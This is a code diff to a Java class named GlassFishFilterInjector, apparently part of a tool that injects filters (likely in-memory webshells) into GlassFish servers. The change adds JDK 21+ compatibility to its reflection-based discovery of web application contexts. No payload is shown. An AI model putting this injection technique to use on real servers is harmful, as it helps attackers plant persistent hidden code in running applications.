@@ -87,7 +87,11 @@ public class GlassFishFilterInjector {
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
             if (thread.getName().contains("ContainerBackgroundProcessor")) {
-                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
+                Object target = getThreadTarget(thread);
+                if (target == null) {
+                    continue;
+                }
+                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(target, "this$0"), "children");
                 for (Object value : childrenMap.values()) {
                     Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
                     contexts.addAll(children.values());
@@ -95,6 +99,18 @@ public class GlassFishFilterInjector {
             }
         }
         return contexts;
+    }
+
+    private Object getThreadTarget(Thread thread) throws Exception {
+        Object target = getFieldValue(thread, "target");
+        if (target == null) {
+            // JDK 21+
+            Object holder = getFieldValue(thread, "holder");
+            if (holder != null) {
+                target = getFieldValue(holder, "task");
+            }
+        }
+        return target;
     }
 
     private ClassLoader getWebAppClassLoader(Object context) throws Exception {
